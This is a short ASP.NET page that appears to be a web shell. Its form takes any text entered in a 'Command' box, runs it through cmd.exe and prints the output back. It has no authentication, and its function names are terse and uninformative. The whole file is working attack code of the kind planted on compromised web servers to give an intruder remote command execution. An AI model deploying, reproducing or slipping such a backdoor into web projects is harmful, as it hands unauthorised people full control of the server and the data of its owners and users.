<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e){
}
string b2(string arg){
	ProcessStartInfo psi = new ProcessStartInfo();
	psi.FileName = "cmd.exe";
	psi.Arguments = "/c " + arg;
	psi.RedirectStandardOutput = true;
	psi.UseShellExecute = false;
	Process p = Process.Start(psi);
	StreamReader stmrdr = p.StandardOutput;
	string s = stmrdr.ReadToEnd();
	stmrdr.Close();
	return s;
}
void a1_2(object sender, System.EventArgs e){
	Response.Write(Server.HtmlEncode(b2(addr.Text)));
}
</script>

<HTML>
<HEAD>
<title>wow</title>
</HEAD>
<body>
<form id="g" method="post" runat="server">
<asp:Label id="lblText" runat="server">Command:</asp:Label>
<asp:TextBox id="addr" runat="server" Width="250px">
</asp:TextBox>
<asp:Button id="testing" runat="server" Text="excute" OnClick="a1_2">
</asp:Button>
</form>
</body>
</HTML>